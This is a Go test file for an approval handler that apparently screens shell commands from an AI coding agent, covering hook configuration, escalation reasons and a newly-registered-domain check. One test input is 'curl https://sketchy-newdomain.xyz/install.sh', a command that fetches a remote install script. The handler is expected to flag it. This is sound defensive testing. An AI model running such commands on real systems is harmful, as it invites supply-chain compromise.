package services

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/tstapler/stapler-squad/pkg/classifier"
	"github.com/tstapler/stapler-squad/server/events"
	"github.com/tstapler/stapler-squad/testutil"
)

// TestApprovalHandler_should_UseBaseURLFnValueAtCallTime_When_ThreeUsageSitesInvoked
// (REQ-3 test #4, plan.md Task 1.3.1b).
//
// Stubs the shared hookBaseURLFn (hook_injector.go) to return a distinct value on every
// invocation and drives InjectHookConfig twice against the same settings file so all three
// known usage sites (approval_handler.go: building the curl command, the "already present"
// short-circuit check, and the legacy-URL migration filter) each execute and each
// must reflect whatever baseURLFn() returns at *their* point of use -- never a
// value snapshotted once at ApprovalHandler construction time.
func TestApprovalHandler_should_UseBaseURLFnValueAtCallTime_When_ThreeUsageSitesInvoked(t *testing.T) {
	// hookApprovalURL() delegates to hook_injector.go's shared hookBaseURLFn (set via
	// SetHookBaseURLFn) -- the same mechanism InjectHooksConfig uses -- rather than a
	// separate ApprovalHandler-owned mechanism. Save/restore it so this test's
	// deliberately-unstable stub base URL doesn't leak into other tests in this
	// package that call hookApprovalURL()/InjectHookConfig and expect the stable
	// default.
	original := hookBaseURLFn
	t.Cleanup(func() { hookBaseURLFn = original })

	calls := 0
	nextAddr := func() string {
		calls++
		return fmt.Sprintf("http://localhost:%d", 20000+calls)
	}

	// baseURLFn resolves to whatever nextAddr() currently returns.
	// This exercises usage site #1 (building the curl command) with the first address.
	SetHookBaseURLFn(nextAddr)
	_ = NewApprovalHandler(NewApprovalStore(""), nil, events.NewEventBus(1))

	tmpDir := t.TempDir()
	if err := InjectHookConfig(tmpDir, "session-a"); err != nil {
		t.Fatalf("InjectHookConfig (first write): %v", err)
	}
	firstAddr := fmt.Sprintf("http://localhost:%d", 20000+calls) // whatever nextAddr() returned during that call

	settings := readSettings(t, tmpDir)
	firstGroups := permissionRequestGroups(t, settings)
	if !commandsContain(firstGroups, firstAddr) {
		t.Fatalf("expected first InjectHookConfig call to bake in the base URL current at that call (%q), got groups: %+v", firstAddr, firstGroups)
	}

	// baseURLFn is the same nextAddr closure, but the counter keeps advancing, so the base
	// URL moves forward, mirroring a server that rebinds to a different port between
	// hook-injection events -- the exact scenario the lazy baseURLFn mechanism exists to
	// support (never a string baked in at construction time).
	if err := InjectHookConfig(tmpDir, "session-a"); err != nil {
		t.Fatalf("InjectHookConfig (second write): %v", err)
	}

	settings = readSettings(t, tmpDir)
	secondGroups := permissionRequestGroups(t, settings)

	// Usage site #2 (the "already present" short-circuit) must have compared against
	// the CURRENT base URL, not the first call's -- otherwise it would have incorrectly
	// matched the stale entry and skipped writing a fresh one entirely.
	//
	// Usage site #3 (the legacy-URL migration filter) must also have evaluated against
	// the CURRENT base URL when deciding what to strip -- our command-type entries have
	// no URL field, so both survive, proving the filter ran (using the current value)
	// without wrongly discarding the earlier entry.
	if len(secondGroups) < 2 {
		t.Fatalf("expected the second InjectHookConfig call to prepend a fresh entry alongside the first (proving the 'already present' check used the CURRENT base URL, not a stale snapshot), got %d group(s): %+v", len(secondGroups), secondGroups)
	}
	if !commandsContain(secondGroups, firstAddr) {
		t.Fatalf("expected the original entry (built with %q) to survive the legacy-URL migration filter, got groups: %+v", firstAddr, secondGroups)
	}
	if strings.Contains(fmt.Sprint(secondGroups), firstAddr) && !commandsContainNewerThan(secondGroups, firstAddr) {
		t.Fatalf("expected a newly prepended entry reflecting the base URL current at the SECOND call's point of use, got groups: %+v", secondGroups)
	}
}

// permissionRequestGroups extracts the PermissionRequest hookMatcherGroup slice from a
// parsed settings.local.json top-level map, failing the test on any parse error.
func permissionRequestGroups(t *testing.T, top map[string]json.RawMessage) []hookMatcherGroup {
	t.Helper()
	hooksRaw, ok := top["hooks"]
	if !ok {
		t.Fatal("hooks key not present in settings")
	}
	var hooks map[string]json.RawMessage
	if err := json.Unmarshal(hooksRaw, &hooks); err != nil {
		t.Fatalf("parse hooks map: %v", err)
	}
	prRaw, ok := hooks["PermissionRequest"]
	if !ok {
		t.Fatal("PermissionRequest key not present in hooks")
	}
	var groups []hookMatcherGroup
	if err := json.Unmarshal(prRaw, &groups); err != nil {
		t.Fatalf("parse PermissionRequest groups: %v", err)
	}
	return groups
}

// commandsContain reports whether any command-type hook entry across groups contains substr.
func commandsContain(groups []hookMatcherGroup, substr string) bool {
	for _, g := range groups {
		for _, h := range g.Hooks {
			if h.Type == "command" && strings.Contains(h.Command, substr) {
				return true
			}
		}
	}
	return false
}

// commandsContainNewerThan reports whether any command-type hook entry contains an
// "http://localhost:<port>" address other than staleAddr, i.e. a freshly-written entry
// distinct from the one built with staleAddr.
func commandsContainNewerThan(groups []hookMatcherGroup, staleAddr string) bool {
	for _, g := range groups {
		for _, h := range g.Hooks {
			if h.Type != "command" {
				continue
			}
			if strings.Contains(h.Command, "http://localhost:") && !strings.Contains(h.Command, staleAddr) {
				return true
			}
		}
	}
	return false
}

// ─── Escalation reason regression tests (escalation-reasoning Epic 5.1, Story 5.1.1) ──

// waitForFirstApprovalThenResolve polls the store until an approval appears, captures a
// copy of its escalation fields (immutable post-construction per approval_store.go's
// contract), then resolves it so the blocked HandlePermissionRequest call returns. Runs
// in the caller's goroutine -- callers should invoke it via `go` before firing the
// blocking POST.
func waitForFirstApprovalThenResolve(t *testing.T, store *ApprovalStore, captured *PendingApproval) {
	t.Helper()
	var approvalID string
	err := testutil.WaitForCondition(func() bool {
		approvals := store.ListAll()
		if len(approvals) > 0 {
			approvalID = approvals[0].ID
			return true
		}
		return false
	}, testutil.FastWaitConfig())
	if err != nil || approvalID == "" {
		t.Errorf("approval never appeared in store: %v", err)
		return
	}
	a, found := store.Get(approvalID)
	if !found {
		t.Errorf("approval %s disappeared before it could be captured", approvalID)
		return
	}
	*captured = *a
	if err := store.Resolve(approvalID, ApprovalDecision{Behavior: "deny", Message: "test cleanup"}); err != nil {
		t.Errorf("Resolve returned error: %v", err)
	}
}

// TestHandlePermissionRequest_EscalationReason_NoMatch covers AC1's no-match path: a
// command matching zero classifier rules must populate PendingApproval.EscalationReason
// with the static fallback sentence and EscalationCategory "no-match" (plan.md Task
// 5.1.1b, validation.md AC1 "end-to-end capture at source" row).
func TestHandlePermissionRequest_EscalationReason_NoMatch(t *testing.T) {
	h, store := newTestHandler(5 * time.Second)
	h.SetClassifier(classifier.NewRuleBasedClassifier())

	var captured PendingApproval
	go waitForFirstApprovalThenResolve(t, store, &captured)

	postPermissionRequestWithCommand(t, h, "test-session", "Bash", "totally-unmatched-cmd-xyz123 --flag")

	if captured.EscalationReason != "No matching rule; escalated for manual review." {
		t.Errorf("EscalationReason = %q, want the static no-match fallback sentence", captured.EscalationReason)
	}
	if captured.EscalationCategory != "no-match" {
		t.Errorf("EscalationCategory = %q, want %q", captured.EscalationCategory, "no-match")
	}
}

// TestHandlePermissionRequest_EscalationReason_ExplicitRule covers AC1's explicit-rule
// path: "git branch -d feature/foo" matches the seed rule
// seed-escalate-git-branch-safe-delete, so EscalationReason must be that rule's own
// Reason text verbatim and EscalationCategory "explicit-rule" (plan.md Story 2.1.2's
// example, validation.md AC1 row).
func TestHandlePermissionRequest_EscalationReason_ExplicitRule(t *testing.T) {
	h, store := newTestHandler(5 * time.Second)
	h.SetClassifier(classifier.NewRuleBasedClassifier())

	var captured PendingApproval
	go waitForFirstApprovalThenResolve(t, store, &captured)

	postPermissionRequestWithCommand(t, h, "test-session", "Bash", "git branch -d feature/foo")

	wantReason := "Branch deletion modifies repository structure and should be reviewed."
	if captured.EscalationReason != wantReason {
		t.Errorf("EscalationReason = %q, want %q", captured.EscalationReason, wantReason)
	}
	if captured.EscalationCategory != "explicit-rule" {
		t.Errorf("EscalationCategory = %q, want %q", captured.EscalationCategory, "explicit-rule")
	}
}

// fakeRDAPTransport is an http.RoundTripper stub that returns a canned RDAP response
// reporting the given registration date for any request, regardless of host -- avoids
// a real network call to rdap.org from a unit test.
type fakeRDAPTransport struct {
	registeredAt time.Time
}

func (f *fakeRDAPTransport) RoundTrip(_ *http.Request) (*http.Response, error) {
	body := fmt.Sprintf(`{"events":[{"eventAction":"registration","eventDate":%q}]}`, f.registeredAt.Format(time.RFC3339))
	return &http.Response{
		StatusCode: http.StatusOK,
		Status:     "200 OK",
		Body:       io.NopCloser(strings.NewReader(body)),
		Header:     make(http.Header),
	}, nil
}

// TestHandlePermissionRequest_EscalationReason_DomainAge covers AC1's domain-age path:
// a Bash command contacting a newly-registered domain must populate EscalationReason
// with the domain-age sentence (approval_handler.go's `Domain %q was registered within
// the last %d days...` format) and EscalationCategory "domain-age" (plan.md Story 2.1.3's
// worked example, validation.md AC1 row). This path short-circuits via `goto
// createApproval` before the classifier ever runs, so no classifier is configured here.
func TestHandlePermissionRequest_EscalationReason_DomainAge(t *testing.T) {
	h, store := newTestHandler(5 * time.Second)

	checker := NewDomainAgeChecker(true)
	checker.httpClient = &http.Client{
		Transport: &fakeRDAPTransport{registeredAt: time.Now().Add(-5 * 24 * time.Hour)},
	}
	h.SetDomainChecker(checker)

	var captured PendingApproval
	go waitForFirstApprovalThenResolve(t, store, &captured)

	postPermissionRequestWithCommand(t, h, "test-session", "Bash", "curl https://sketchy-newdomain.xyz/install.sh")

	wantReason := `Domain "sketchy-newdomain.xyz" was registered within the last 30 days — possible phishing or supply-chain risk.`
	if captured.EscalationReason != wantReason {
		t.Errorf("EscalationReason = %q, want %q", captured.EscalationReason, wantReason)
	}
	if captured.EscalationCategory != "domain-age" {
		t.Errorf("EscalationCategory = %q, want %q", captured.EscalationCategory, "domain-age")
	}
}
